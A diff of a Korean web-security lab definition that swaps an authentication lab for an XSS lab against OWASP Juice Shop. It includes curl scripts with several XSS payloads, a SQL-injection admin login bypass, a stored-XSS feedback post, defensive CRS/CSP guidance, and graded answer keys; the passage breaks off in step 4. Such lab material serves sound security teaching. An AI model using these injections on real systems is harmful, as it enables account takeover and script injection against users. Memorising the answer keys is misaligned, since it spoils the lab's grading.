@@ -1,826 +1,1979 @@
-lab_id: web-vuln-ai-week06
-title: 인증/세션 취약점 실습 (AI 지원)
-version: ai
-course: web-vuln-ai
+lab_id: standalone-web-vuln-week06
+title: "입력값 검증 (2) — XSS (Reflected/Stored/DOM) + CSP 방어 + CSRF 기초"
+version: standalone-non-ai
+course: web-vuln
 week: 6
-description: 인증 메커니즘과 세션 관리의 취약점을 분석하고 공격과 방어를 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를
-  검증합니다.
+description: |
+  XSS 의 3 카테고리 (Reflected / Stored / DOM-based) 를 Juice Shop (Angular SPA +
+  Express backend) 의 endpoint 별 시도. server sanitize / Angular 의 trust pipe /
+  CSP 헤더 의 default 정책 확인 + 우회 시도. Blue 측 ModSecurity CRS 941 XSS 룰
+  매핑 + Purple 의 다층 방어 (입력 sanitize + CSP + HttpOnly + SameSite).
 difficulty: medium
 duration_minutes: 120
+audience: 웹 보안 입문자 (3주차)
+prerequisites:
+  - "W02 의 SQLi (특히 step 5 의 Users dump) 완료 — admin@juice-sh.op JWT 토큰"
+  - "attacker 컨테이너 (10.20.30.202) 에 curl + nikto + dalfox/xsstrike (가능 시) 설치"
+  - "브라우저 (Chrome / Firefox) 로 http://juice.6v6.lab/ 직접 접근 (DOM XSS 시각 확인)"
 objectives:
-- 인증 취약점을 탐지한다
-- 세션 관리 취약점을 이해한다
-- 안전한 인증 구현을 학습한다
+  - "XSS 3 카테고리 (Reflected / Stored / DOM-based) 의 차이 + 각 카테고리 의 *공격 시점* 설명"
+  - "Juice Shop 의 의도된 XSS challenge (DOM /#/search?q= + Stored /api/Feedbacks) 직접 시도"
+  - "다양 payload (script / img onerror / svg onload / iframe srcdoc / javascript: URI) + 인코딩 우회"
+  - "CSP 헤더 의 default 정책 + 우회 기법 (inline script 허용 / unsafe-inline / nonce 우회)"
+  - "Red/Blue/Purple — Red 3 카테고리 시도 → Blue ModSec CRS 941100~941999 매핑 → Purple 의 입력 sanitize + CSP strict + HttpOnly + DOMPurify 다층 방어"
 pass_threshold: 0.6
 steps:
+# ============================================================
+# STEP 1 [RED·XSS·Reflected] — Juice Shop server sanitize 확인 + Angular 의 차이
+# ============================================================
 - order: 1
-  instruction: '{{WEB_IP}} 대상으로 로그인 메커니즘 분석을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Reflected XSS = URL query param 이 *server 응답 본문에 즉시 반사* 되어 브라우저
+    가 script 실행. Juice Shop (Angular SPA) 은 서버 가 항상 index.html 만 반환
+    (router 는 client-side) → server-reflected XSS 거의 불가. 반대로 *DOM-based
+    XSS* 가 main vector (step 3). 본 step 은 server reflect 시도 + sanitize 확인.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 로그인 메커니즘 분석 관련 도구와 기법을 활용하세요.
-  category: auth
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. URL query param 의 script 시도
+    echo "=== 1. /rest/products/search?q=<script>... ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=apple%3Cscript%3Ealert(1)%3C/script%3E" | head -c 300
+
+    # 2. 응답 본문 에 q 가 직접 인용 되는지
+    echo ""
+    echo "=== 2. q 의 반사 여부 grep ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=XYZUNIQUE123" | grep -c "XYZUNIQUE123"
+
+    # 3. /api/Users?email= (다른 endpoint)
+    echo ""
+    echo "=== 3. /api/Feedbacks/?author=<script> (server reflect?) ==="
+    curl -s "http://juice.6v6.lab/api/Feedbacks/?author=%3Cscript%3E" | head -c 300
+
+    # 4. 404 페이지 의 URL 반사 (흔한 reflected XSS)
+    echo ""
+    echo "=== 4. /<script>alert(1)</script> 404 page ==="
+    curl -s "http://juice.6v6.lab/%3Cscript%3Ealert(1)%3C/script%3E" | head -c 200
+    ```
+
+    ## 📋 확인 사항
+
+    - `/rest/products/search?q=...` 응답: `{"status":"success","data":[...]}` JSON
+      (q 가 LIKE pattern 으로 SQL 에 들어가지만 *response body 에는 직접 인용 안 됨*)
+    - server reflected XSS = **거의 불가** (Express + Sequelize 의 JSON 응답)
+    - 404 페이지 도 path 의 script 직접 반사 X
+    - Angular SPA 의 본질 = 모든 라우팅이 client-side → server reflect 표적 소수
+
+    ## 💡 왜 이걸 하는가?
+
+    Modern SPA (Angular / React / Vue) 는 *server-rendered HTML* 이 거의 없음 →
+    Reflected XSS 의 표적 endpoint 자체가 적음. 대신 **DOM-based XSS** (step 3)
+    가 main vector. 학생은 *서버 반사 vs DOM 의 차이* 와 SPA 의 보안 모델을 이해.
+    OWASP A03 Injection + MITRE T1059.007 JavaScript.
+
+    ## 🔵 Blue 측 관찰
+
+    URL query 에 `<script>` 시도는 ModSecurity CRS rule 941100 (XSS Filter
+    Category 1: script tag vector) 의 직접 트리거. 학습 환경 default = DetectionOnly
+    → audit log 만 기록 + 차단 X. 학생이 직접 modsec_audit.log grep 으로 rule
+    매치 확인 가능.
+
+    ## 🟣 Purple 보완 권장
+
+    - Express: `helmet()` middleware 자동 보안 헤더 (X-XSS-Protection, X-Content-Type-Options
+      등)
+    - 응답 sanitize 라이브러리 (DOMPurify 가 client-side 의 main 방어)
+    - ModSec CRS PARANOIA LEVEL 2-3 + rule 941100~941999 enable
+    - **CSP 헤더** (step 9 에서 본격) — `script-src 'self'` 으로 inline script 차단
+  hint: |
+    Juice Shop 은 Angular SPA → server reflected XSS 거의 불가. DOM-based (step 3)
+    가 main vector. grep -c 으로 q 의 응답 본문 직접 인용 횟수 확인 (0 = sanitize).
+  category: xss_reflected
   points: 8
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
-    \ curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘 분석 완료'"
-  answer_detail: 로그인 메커니즘 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    echo "=== 1. /rest/products/search?q=<script>... ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=apple%3Cscript%3Ealert(1)%3C/script%3E" | head -c 300
+    echo ""
+    echo "=== 2. q=XYZUNIQUE123 응답 본문 반사 횟수 ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=XYZUNIQUE123" | grep -c "XYZUNIQUE123"
+    echo ""
+    echo "=== 3. 404 페이지 의 path 반사 ==="
+    curl -s "http://juice.6v6.lab/%3Cscript%3Ealert(1)%3C/script%3E" | head -c 200
+    echo ""
+    echo "결론: Juice Shop server endpoint 는 q/path 의 script 직접 반사 X (Angular SPA + sanitize)"
+  answer_detail: |
+    Juice Shop 의 server endpoint (Express + Sequelize) 는 JSON 응답만 → server
+    reflected XSS 거의 불가. 단 *DOM-based XSS* (step 3 의 /#/search?q=) 는 Angular
+    의 client-side innerHTML trust 로 발생. SPA 의 main XSS vector 는 DOM 또는
+    Stored. 학생은 Modern SPA 의 XSS 표적 차이를 이해.
   verify:
     type: output_contains
-    expect: 완료
+    expect: '결론\|search\|status'
     field: stdout
     semantic:
-      intent: 로그인 메커니즘 분석 — 로그인 엔드포인트·필드명·응답 코드·세션 쿠키 설정 파악
+      intent: |
+        Reflected XSS 시도 → Juice Shop server sanitize 확인 + Angular SPA 의
+        구조적 차이 (DOM 이 main vector). OWASP A03 + MITRE T1059.007.
       success_criteria:
-      - curl 로 정상/잘못된 자격증명 시도 후 응답 비교
-      - Set-Cookie 헤더에서 세션 쿠키명과 속성 확인
-      - 응답 본문 또는 상태 코드 차이 (타이밍 차이 포함) 기록
+        - 최소 2 endpoint (search / 404 / Feedbacks) 시도
+        - q 의 응답 본문 반사 횟수 측정 (grep -c)
+        - SPA vs server-rendered HTML 차이 명시
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
-      - curl -v -d username=test -d password=test <login>
-      - Burp Proxy + Repeater
-      - python requests session 로 쿠키 추적
-      - mitmproxy 로 요청 기록
+        - "curl + grep -c 응답 본문 반사 횟수"
+        - "dalfox -u http://juice.6v6.lab/ (자동화)"
+        - "XSStrike -u http://...?q= (반사 정밀 탐지)"
+        - "Burp Repeater 의 payload 변형"
       negative_signs:
-      - 단일 시도만
-      - 쿠키/응답 분석 없음
-      - 타이밍 차이 언급 없음
+        - server reflect 단일 endpoint 만
+        - Angular SPA / DOM XSS 차이 언급 없음
+        - sanitize 결과 해석 누락
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘\
-    \ 분석 완료'"
+  script: |
+    curl -s "http://juice.6v6.lab/rest/products/search?q=apple%3Cscript%3Ealert(1)%3C/script%3E" | head -c 300
+    echo ""
+    echo "q=XYZUNIQUE123 반사 횟수: $(curl -s 'http://juice.6v6.lab/rest/products/search?q=XYZUNIQUE123' | grep -c 'XYZUNIQUE123')"
+    curl -s "http://juice.6v6.lab/%3Cscript%3Ealert(1)%3C/script%3E" | head -c 200
+    echo ""
+    echo "결론: server reflected XSS 거의 불가 (SPA + sanitize) — DOM-based 가 main vector"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 server reflected XSS 가능성 점검 —
+    (1) /rest/products/search?q=<script> (2) /api/Feedbacks/?author=<script>
+    (3) 404 페이지 의 path 반사 (4) q=XYZUNIQUE123 의 응답 본문 반사 횟수 (grep -c).
+    Juice Shop 의 Angular SPA + JSON 응답 의 server reflected XSS 거의 불가 +
+    DOM-based (step 3) 가 main vector 라는 SPA 보안 모델 차이 설명. MITRE
+    T1059.007 + OWASP A03 + ModSec CRS 941100 매핑.
+# ============================================================
+# STEP 2 [RED·XSS·Payload Variants] — script 외 6 벡터 (img/svg/iframe/body/input/javascript:)
+# ============================================================
 - order: 2
-  instruction: '{{WEB_IP}} 대상으로 브루트포스 공격 시뮬레이션을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS payload 의 6 가지 대표 벡터 (script tag 외) 학습 + 각 벡터의 *언제 trigger*
+    되는지 표로 정리. WAF / sanitizer 가 `<script>` 만 차단하는 경우 우회 가능
+    (CRS rule 941100 은 script tag 전용, 941110+ 는 다른 태그).
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 브루트포스 공격 시뮬레이션 관련 도구와 기법을 활용하세요.
-  category: auth
+    ## 💻 실행 명령
+
+    ```bash
+    # 6 벡터 payload + URL-encoded (Juice Shop /rest/products/search 의 응답 반사 확인)
+    for label_payload in \
+      "1-script:<script>alert(1)</script>" \
+      "2-img:<img src=x onerror=alert(1)>" \
+      "3-svg:<svg onload=alert(1)>" \
+      "4-iframe:<iframe srcdoc=<script>alert(1)</script>>" \
+      "5-body:<body onload=alert(1)>" \
+      "6-input:<input autofocus onfocus=alert(1)>" \
+      "7-javascript_uri:<a href=javascript:alert(1)>click</a>" \
+      ; do
+      label=$(echo "$label_payload" | cut -d: -f1)
+      payload=$(echo "$label_payload" | cut -d: -f2-)
+      # URL-encoded query (LIKE pattern 의 일부 가 됨)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+
+    # ModSec audit log (DetectionOnly 의 매치된 룰 확인 — bastion 의 docker exec 필요)
+    echo ""
+    echo "=== ModSec audit log 최근 매치 룰 (선택) ==="
+    # ssh 6v6-bastion 'sudo docker exec 6v6-web tail -200 /var/log/apache2/modsec_audit.log \
+    #   | grep -oE "\"ruleId\":\"[0-9]+\"" | sort -u | head'
+    ```
+
+    ## 📋 확인 사항 (XSS 벡터 trigger 시점 표)
+
+    | 벡터 | HTML 컨텍스트 | trigger 시점 | 차단 ModSec 룰 |
+    |------|-------------|------------|---------------|
+    | `<script>` | element | 페이지 load 즉시 | 941100 |
+    | `<img onerror>` | element + error event | img src 로드 실패 시 | 941110 |
+    | `<svg onload>` | element + load event | svg load 시 | 941160 |
+    | `<iframe srcdoc>` | element + nested HTML | iframe load 시 | 941130 |
+    | `<body onload>` | element | body load 시 | 941110 |
+    | `<input autofocus onfocus>` | element + focus event | input focus 시 (자동) | 941160 |
+    | `javascript:` URI | href / src 속성 | 클릭 / iframe src | 941180 |
+
+    ## 💡 왜 이걸 하는가?
+
+    CRS rule 941100 (script tag) 차단만 의존하면 *우회 쉬움* — `<img onerror>` /
+    `<svg onload>` 등 7+ 벡터 별도. OWASP A03 + MITRE T1059.007. 학생은
+    *script 외 벡터 의 존재* 와 *WAF rule 의 다중성* 학습.
+
+    ## 🔵 Blue 측 작업
+
+    ModSec CRS 941 룰 set 의 *전체* enable (PARANOIA LEVEL 2-3). 단일 941100
+    만 enable 시 vendor 의 default 차단 가능 — 우회 위험. modsec_audit.log
+    의 ruleId 통계 로 차단 분포 확인.
+
+    ## 🟣 Purple 보완 권장
+
+    - **Sanitizer**: DOMPurify (client-side) 또는 sanitize-html (Express middleware)
+      — script 외 모든 HTML tag whitelist + attribute filter
+    - **CSP**: `script-src 'self'` (inline 차단) + `'unsafe-inline'` 제거 (step 9)
+    - **HttpOnly cookie**: `<script>document.cookie</script>` 의 직접 탈취 차단
+    - **ModSec CRS rule 941100~941180 전체 enable** (PARANOIA 2)
+  hint: |
+    for-loop + 7 payload 벡터. 응답 코드 비교 = DetectionOnly 라 모두 200/500 (LIKE
+    매치 0 이라 empty data). ModSec 차단은 audit log 에 rule 매치 기록.
+  category: xss_reflected
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
-    \ 시뮬레이션 완료'"
-  answer_detail: 브루트포스 공격 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    for label_payload in \
+      "1-script:<script>alert(1)</script>" \
+      "2-img:<img src=x onerror=alert(1)>" \
+      "3-svg:<svg onload=alert(1)>" \
+      "4-iframe:<iframe srcdoc=<script>1</script>>" \
+      "5-body:<body onload=alert(1)>" \
+      "6-input:<input autofocus onfocus=alert(1)>" \
+      "7-javascript_uri:<a href=javascript:alert(1)>" \
+      ; do
+      label=$(echo "$label_payload" | cut -d: -f1)
+      payload=$(echo "$label_payload" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+    echo "결론: 7 벡터 모두 시도 — ModSec DetectionOnly 라 차단 X (audit log 매치 만)"
+  answer_detail: |
+    XSS payload 의 7+ 벡터 — script tag 외 img/svg/iframe/body/input/javascript: URI.
+    Juice Shop /rest/products/search 는 JSON 응답 + LIKE 패턴 매치 0 이라 응답 본문
+    반사 0. 진짜 XSS trigger 는 brower 의 DOM render 시 (Stored 또는 DOM-based).
+    학생은 *벡터 다중성* + WAF 룰 별 차단 분포 학습.
   verify:
     type: output_contains
-    expect: 완료
+    expect: '결론\|code='
     field: stdout
     semantic:
-      intent: 브루트포스 시뮬레이션 — 계정 잠금·Rate Limit 검증 (hydra/medusa 또는 수동 반복)
+      intent: |
+        XSS payload 의 7+ 벡터 (script/img/svg/iframe/body/input/javascript:) 시도
+        + ModSec CRS 941100~941180 룰 매핑. script 단일 차단 의존의 위험. OWASP
+        A03 + MITRE T1059.007.
       success_criteria:
-      - 최소 10회 반복 시도 후 응답 코드·본문 변화
-      - Rate Limiting 또는 계정 잠금 여부 판정
-      - 429 또는 Retry-After 헤더 해석
+        - 최소 5 벡터 (script + img + svg + 2 추가) 시도
+        - 각 벡터 의 trigger 시점 또는 HTML 컨텍스트 명시
+        - ModSec CRS 941xx 룰 ID 최소 3 개 매핑
+        - script 단일 차단의 우회 위험 언급
       acceptable_methods:
-      - hydra -l <user> -P wordlist.txt <url>
-      - for i in 1..20; do curl ...; done
-      - Burp Intruder sniper 모드
-      - medusa -h <host> -U users.txt -P passes.txt
+        - "curl -G + 7 벡터 for-loop"
+        - "dalfox -u http://...?q= (자동화)"
+        - "XSStrike 또는 XSSHunter"
+        - "Burp Intruder pitchfork 의 payload list"
       negative_signs:
-      - 단일 시도로 판정
-      - Rate Limit 해석 없음
-      - 429/계정 잠금 언급 없음
+        - script 벡터 만 (다른 벡터 누락)
+        - trigger 시점 / HTML 컨텍스트 설명 없음
+        - ModSec rule ID 매핑 없음
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
-    \ 시뮬레이션 완료'"
+  script: |
+    for p in "script:<script>alert(1)</script>" "img:<img src=x onerror=alert(1)>" \
+             "svg:<svg onload=alert(1)>" "iframe:<iframe srcdoc=<script>1</script>>" \
+             "body:<body onload=alert(1)>" "input:<input autofocus onfocus=alert(1)>" \
+             "js_uri:<a href=javascript:alert(1)>"; do
+      label=$(echo "$p" | cut -d: -f1)
+      payload=$(echo "$p" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: ${code}"
+    done
+    echo "결론: 7 벡터 시도 — ModSec DetectionOnly 라 차단 X"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 /rest/products/search?q= 에 7 XSS 벡터
+    (script/img onerror/svg onload/iframe srcdoc/body onload/input onfocus/
+    javascript: URI) payload for-loop 시도 + 응답 코드 비교. ModSec CRS 941100~941180
+    룰 매핑 (script 941100, img 941110, svg 941160, iframe 941130 등) 표 + script
+    단일 차단의 우회 위험 + Purple = DOMPurify + CSP + HttpOnly + PARANOIA 2-3.
+# ============================================================
+# STEP 3 [RED·XSS·Stored] — Feedback 저장 (server sanitize 확인) + 우회 시도
+# ============================================================
 - order: 3
-  instruction: '{{WEB_IP}} 대상으로 패스워드 정책 검증을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Stored XSS = payload 가 DB 에 저장 → 다른 user 가 페이지 render 시 실행 (영향
+    범위 = *전체 방문자*). Juice Shop 의 stored endpoint = `/api/Feedbacks` (CAPTCHA
+    필요). 1차 POST → server-side sanitize 확인 → 우회 payload 시도.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 패스워드 정책 검증 관련 도구와 기법을 활용하세요.
-  category: auth
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 패스워드 정책 검증을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
-    \ curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책 검증 완료'"
-  answer_detail: 패스워드 정책 검증은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. 로그인 + JWT 토큰 (W02 step 3 의 인증 우회)
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))")
+    echo "TOKEN: ${TOKEN:0:30}..."
+
+    # 2. CAPTCHA 발급 (Juice Shop 의 reusable captcha endpoint)
+    CAPTCHA=$(curl -s http://juice.6v6.lab/rest/captcha/)
+    echo "CAPTCHA: ${CAPTCHA}"
+    CID=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
+    CANS=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")
+
+    # 3. Feedback POST with XSS payload
+    echo ""
+    echo "=== 3. Feedback POST + iframe srcdoc payload ==="
+    curl -s -X POST http://juice.6v6.lab/api/Feedbacks/ \
+      -H 'Content-Type: application/json' -H "Authorization: Bearer ${TOKEN}" \
+      -d "{\"comment\":\"XSStest <iframe src=javascript:alert('xss')>\",\"rating\":5,\"captchaId\":${CID},\"captcha\":\"${CANS}\"}" \
+      | python3 -m json.tool | head -15
+
+    # 4. Feedback GET (저장 결과 확인 — sanitize 여부)
+    echo ""
+    echo "=== 4. Feedback GET (저장된 comment 의 sanitize 여부) ==="
+    curl -s http://juice.6v6.lab/api/Feedbacks/ | python3 -c "
+    import sys,json
+    d = json.load(sys.stdin)
+    for f in d.get('data',[])[-3:]:
+        print(f'  comment: {f.get(\"comment\",\"\")[:100]}')
+    "
+    ```
+
+    ## 📋 확인 사항
+
+    - POST 응답: 저장 성공 (`id`, `comment`, `createdAt`) — **단 comment 가 일부
+      sanitize 됨** (`<iframe ...>` 부분 제거 → "XSStest " 만 저장)
+    - Juice Shop 의 default sanitize = HTML tag (`<...>`) 제거 → script tag /
+      iframe / svg 모두 제거
+    - 그러나 *Angular 의 client-side render* 시 다른 sanitize 정책 적용 (DOM XSS 별도)
+    - **우회 시도** = `<<script>` (잘못된 nested) 또는 `&lt;script&gt;` (entity)
+      — 일부 우회 가능 한 경우 있음
+
+    ## 💡 왜 이걸 하는가?
+
+    Stored XSS 가 *Reflected 대비 100배 위험* (모든 방문자 영향). OWASP A03 +
+    MITRE T1059.007 + Persistence (T1505). Juice Shop default 는 *server-side
+    sanitize* 가 1차 방어 — 학생은 sanitize 의 *결과 확인* + 우회 변형 시도 학습.
+
+    ## 🔵 Blue 측 관찰
+
+    Feedback POST 시도는 ModSec CRS rule 941100~941180 매치 (XSS attack
+    detected). 학습 환경 default DetectionOnly → audit log 만 기록. Wazuh rule
+    100002 (ModSec alert) escalation. Blue 정기 cron 으로 audit log 의 rule
+    매치 통계 + IP 별 burst 모니터링.
+
+    ## 🟣 Purple 보완 권장
+
+    - **Server sanitize**: Express 의 `sanitize-html` 또는 `DOMPurify` (node 버전)
+      — whitelist 기반 tag/attribute 제거
+    - **Client render sanitize**: Angular 의 `DomSanitizer.bypassSecurityTrust*`
+      사용 금지 (Juice Shop 의 challenge — 의도적으로 사용)
+    - **CSP** (step 9): `script-src 'self'` + nonce
+    - **WAF**: ModSec CRS 941xx + custom rule (Juice Shop /api/Feedbacks 의 POST
+      body inspection 강화)
+  hint: |
+    Juice Shop /api/Feedbacks 는 captchaId + captcha 필수. captcha 발급 →
+    POST. comment 의 sanitize 결과 GET 으로 확인 ("XSStest " 만 저장 = HTML tag
+    제거됨).
+  category: xss_stored
+  points: 12
+  answer: |
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))")
+    CAPTCHA=$(curl -s http://juice.6v6.lab/rest/captcha/)
+    CID=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
+    CANS=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")
+    echo "=== POST (XSS payload) ==="
+    curl -s -X POST http://juice.6v6.lab/api/Feedbacks/ \
+      -H 'Content-Type: application/json' -H "Authorization: Bearer ${TOKEN}" \
+      -d "{\"comment\":\"XSStest <iframe src=javascript:alert('xss')>\",\"rating\":5,\"captchaId\":${CID},\"captcha\":\"${CANS}\"}" \
+      | python3 -m json.tool | head -10
+    echo "=== GET (sanitize 확인) ==="
+    curl -s http://juice.6v6.lab/api/Feedbacks/ | python3 -c "
+    import sys,json
+    d = json.load(sys.stdin)
+    for f in d.get('data',[])[-2:]:
+        print(f'  comment: {f.get(\"comment\",\"\")[:100]}')
+    "
+  answer_detail: |
+    Juice Shop Feedback POST → server-side sanitize 가 HTML tag 모두 제거 (XSStest
+    만 저장). 진짜 stored XSS = (a) tag 우회 (b) Angular client render 의 trust pipe
+    (DOM XSS) (c) admin 만 가능한 endpoint (Products 의 description). Stored 의
+    위험성 = 한 번 저장 → 모든 방문자 영향. Persistence (T1505) 와 결합.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - web_scan
-    - 10.20.32.80
+    expect: 'comment\|XSStest'
     field: stdout
     semantic:
-      intent: 패스워드 정책 검증 — 짧은/공용/약한 패스워드 허용 여부, haveibeenpwned API 등 유출 이력 체크
+      intent: |
+        Stored XSS — Juice Shop Feedback 의 captcha 통과 + POST + GET 으로 server
+        sanitize 결과 확인. OWASP A03 + MITRE T1059.007 + T1505 Persistence.
+        Stored 의 영향 = 전체 방문자.
       success_criteria:
-      - 최소 3가지 약한 패스워드(1234/password/admin) 시도
-      - 정책(최소 길이·복잡도·유출 차단) 미비점 식별
-      - NIST SP 800-63B 권고 언급
+        - 로그인 JWT + Captcha 발급 + Feedback POST 시도
+        - GET 으로 저장된 comment 의 sanitize 결과 확인
+        - server-side sanitize 의 default 동작 (HTML tag 제거) 명시
+        - Stored vs Reflected 의 위험 차이 설명
       acceptable_methods:
-      - API 회원가입/변경으로 테스트 비밀번호 시도
-      - haveibeenpwned API 조회
-      - zxcvbn 복잡도 추정
-      - OWASP ASVS v4 V2 참조
+        - "curl + login + captcha + POST + GET"
+        - "Burp Repeater 의 POST + 다른 user GET"
+        - "Browser DevTools 의 stored payload render 확인"
+        - "다른 endpoint (Users / Addresses / Products) 시도"
       negative_signs:
-      - 단일 패스워드만 테스트
-      - 유출 이력 체크 없음
-      - 표준 기준 없이 주관 평가
+        - POST 만 시도 + GET 으로 sanitize 결과 확인 없음
+        - server sanitize 의 동작 (tag 제거) 분석 누락
+        - Stored 의 영향 범위 설명 없음
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책\
-    \ 검증 완료'"
+  script: |
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))")
+    CAPTCHA=$(curl -s http://juice.6v6.lab/rest/captcha/)
+    CID=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
+    CANS=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")
+    curl -s -X POST http://juice.6v6.lab/api/Feedbacks/ \
+      -H 'Content-Type: application/json' -H "Authorization: Bearer ${TOKEN}" \
+      -d "{\"comment\":\"XSStest <iframe src=javascript:alert(xss)>\",\"rating\":5,\"captchaId\":${CID},\"captcha\":\"${CANS}\"}" | head -c 300
+    echo ""
+    curl -s http://juice.6v6.lab/api/Feedbacks/ | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['data'][-1].get('comment','')[:80])"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 패스워드 정책 검증을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 stored XSS 시도 — (1) admin JWT 토큰
+    획득 (2) /rest/captcha/ 발급 (3) /api/Feedbacks/ POST + comment 에 XSS payload
+    (4) GET 으로 server-side sanitize 결과 확인 (HTML tag 제거됨 = "XSStest" 만 저장).
+    Stored vs Reflected 위험 차이 (전체 방문자 영향) + Purple = sanitize-html +
+    DOMPurify + CSP + ModSec CRS 941xx 다층 방어.
+# ============================================================
+# STEP 4 [RED·XSS·DOM-based] — Angular SPA 의 trust pipe / innerHTML / location.hash
+# ============================================================
 - order: 4
-  instruction: '{{WEB_IP}} 대상으로 세션 토큰 엔트로피 분석을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    DOM-based XSS = *server 응답에는 payload 가 없음* + 클라이언트 JS 가 location.hash
